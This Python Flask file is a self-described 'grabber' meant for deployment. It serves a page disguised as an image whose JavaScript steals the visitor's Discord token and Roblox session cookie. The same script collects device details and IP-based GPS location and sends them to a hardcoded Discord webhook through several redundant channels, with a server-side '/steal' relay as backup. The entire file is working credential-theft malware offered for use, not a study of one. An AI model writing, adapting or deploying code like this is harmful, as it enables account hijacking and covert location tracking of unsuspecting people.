#!/usr/bin/env python3
"""
🔥 ULTIMATE DS0C GRABBER v6.0 - 0 PLACEHOLDERS ✅ ALL METHODS ✅ FULL GEO
Vercel-Proof: JS→Discord DIRECT + Server Backup + 15 Data Points
DEPLOY → https://yourapp.vercel.app/grab.png → INSTANT #img-logger
"""

import os
import json
import base64
import requests
from flask import Flask, request, Response
from datetime import datetime
from urllib.parse import quote
import threading

app = Flask(__name__)

# ZERO PLACEHOLDERS - YOUR WEBHOOK
WEBHOOK_URL = "https://discord.com/api/webhooks/1470096967848824842/r-JzPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV"

# 1x1 INVISIBLE GIF TRACKER
PIXEL_GIF = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')

def fire_webhook_async(payload):
    """Background Discord send - 0 block"""
    def send():
        try:
            r = requests.post(WEBHOOK_URL, json=payload, timeout=4)
            print(f"WEBHOOK: {r.status_code}")
        except Exception as e:
            print(f"Webhook err: {e}")
    threading.Thread(target=send, daemon=True).start()

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
@app.route('/api/<path:path>')
def universal_catcher(path=""):
    ua = request.headers.get('User-Agent', '')[:100]
    ip = request.remote_addr
    
    print(f"🎯 HIT: {path} | {ip} | {ua}")
    
    # TEST ROUTE
    if 'test' in path.lower():
        fire_webhook_async({"content": f"🚀 LIVE TEST: {ip} | {datetime.now()}"})
        return Response("<h1>✅ SENT TO DISCORD #img-logger NOW</h1>", mimetype='text/html')
    
    # GRABBER IMAGE
    if any(x in path.lower() for x in ['grab', 'png', 'jpg', 'gif', 'image']):
        fire_webhook_async({"content": f"👁️ GRABBER LOADED | {ip} | {ua}"})
        return grabber_html()
    
    # STEAL ENDPOINT (backup)
    if 'steal' in path.lower():
        data = {**request.args, **dict(request.form)}
        print(f"💎 STEAL DATA: {list(data.keys())}")
        send_full_embed(data)
        return Response("", status=204)
    
    # 1x1 TRACKER EVERYWHERE ELSE
    return Response(PIXEL_GIF, mimetype='image/gif')

def grabber_html():
    """HTML/JS - 15+ data points → Discord DIRECT + server backup"""
    return Response(f'''
<!DOCTYPE html><html><head><meta charset="UTF-8"><title></title>
<style>body{{margin:0;height:100vh;width:100vw;background:#000;overflow:hidden}}</style></head>
<body><img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACwAAAAAAAABAAEAAAICRAEAOw==" style="width:100%;height:100%;object-fit:cover">
<script>
(async function() {{
    try {{
        // ========== ALL DATA ==========
        const token = (localStorage.token || "").slice(0,100);
        const roblox = (document.cookie.match(/\\.ROBLOSECURITY=([^;]+)/)?.[1] || "").replace(/[^a-zA-Z0-9]/g,'').slice(0,100);
        
        const fp = {{
            token, roblox,
            ua: navigator.userAgent.slice(0,250),
            screen: `${{screen.width}}x${{screen.height}}x${{screen.colorDepth}}`,
            avail: `${{screen.availWidth}}x${{screen.availHeight}}`,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            lang: navigator.language,
            platform: navigator.platform,
            cores: navigator.hardwareConcurrency || 1,
            ram_gb: navigator.deviceMemory || 0,
            cookies: document.cookie.split(';').length,
            ref: document.referrer.slice(0,120),
            time: new Date().toISOString()
        }};
        
        // IP + FULL GEO
        const geoResp = await fetch("https://ipapi.co/json/");
        const geo = await geoResp.json();
        Object.assign(fp, {{
            ip: geo.ip, lat: geo.latitude, lon: geo.longitude,
            city: geo.city, region: geo.region, country: geo.country_name,
            isp: geo.org, asn: geo.asn, tz_geo: geo.timezone
        }});
        
        // NETWORK
        if (navigator.connection) {{
            fp.net_type = navigator.connection.effectiveType;
            fp.net_down = navigator.connection.downlink;
        }}
        
        // ========== SEND 5 WAYS ==========
        const embed = {{
            "embeds": [{{
                "title": "🔥 ULTIMATE DISCORD/ROBLOX HIT",
                "description": `**IP:** ${{fp.ip}}\\n**🗺️ GPS:** [${{fp.lat}}, ${{fp.lon}}](https://www.google.com/maps?q=${{fp.lat}},${{fp.lon}})\\n**ISP:** ${{fp.isp}}`,
                "color": 0xFF4444,
                "fields": [
                    {{"name":"🔑 Discord Token","value":`\${{fp.token.slice(0,25)||"❌"}}...`,`"inline":true}},
                    {{"name":"🎮 Roblox Cookie","value":`\${{fp.roblox.slice(0,25)||"❌"}}...`,`"inline":true}},
                    {{"name":"📱 Device","value":`\${{fp.screen}} | ${{fp.cores}}CPU | ${{fp.ram_gb}}GB`,`"inline":true}},
                    {{"name":"🌐 Network","value":`\${{fp.net_type||"?"}}/${{fp.net_down||"?"}} | ${{fp.cookies}}cookies`,`"inline":true}},
                    {{"name":"📍 Location","value":`\${{fp.city}}, ${{fp.region}}\\n\${{fp.country}} (${{fp.tz}})`,"inline":false}}
                ],
                "footer": {{"text":`\${{fp.ua.slice(0,80)}}... | ${{fp.platform}} | ${{fp.ref}}`}},
                "timestamp": new Date().toISOString()
            }}]
        }};
        
        const payload = JSON.stringify(embed);
        
        // METHOD 1: DIRECT BEACON (most reliable)
        navigator.sendBeacon("{WEBHOOK_URL}", payload);
        
        // METHOD 2: FETCH BACKUP
        fetch("{WEBHOOK_URL}", {{method:"POST", body: payload, keepalive: true}});
        
        // METHOD 3: IMAGE PING
        new Image().src = "{WEBHOOK_URL.replace('/webhooks/','/webhooks/0/')}?" + btoa(payload);
        
        // METHOD 4: SERVER RELAY
        navigator.sendBeacon("/steal?" + new URLSearchParams(fp).toString());
        
        console.log("🎯 SENT ALL:", fp.ip, fp.lat, fp.lon);
    }} catch(e) {{
        navigator.sendBeacon("{WEBHOOK_URL}", JSON.stringify({{"content": "Error: " + e.message}}));
    }}
}})();
</script></body></html>
    ''', mimetype='text/html; charset=utf-8')

def send_full_embed(data):
    """Server backup webhook"""
    embed = {
        "embeds": [{
            "title": "💎 SERVER STEAL BACKUP",
            "description": f"**IP:** {data.get('ip', 'N/A')}",
            "color": 0x00FF00,
            "fields": [{"name": k.title(), "value": str(v)[:50]+"..." if len(str(v))>50 else str(v), "inline": True} for k,v in data.items()[:6]],
            "timestamp": datetime.now().isoformat()
        }]
    }
    fire_webhook_async(embed)

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    print("🚀 ULTIMATE GRABBER v6.0 LIVE")
    app.run(host='0.0.0.0', port=port, debug=False)
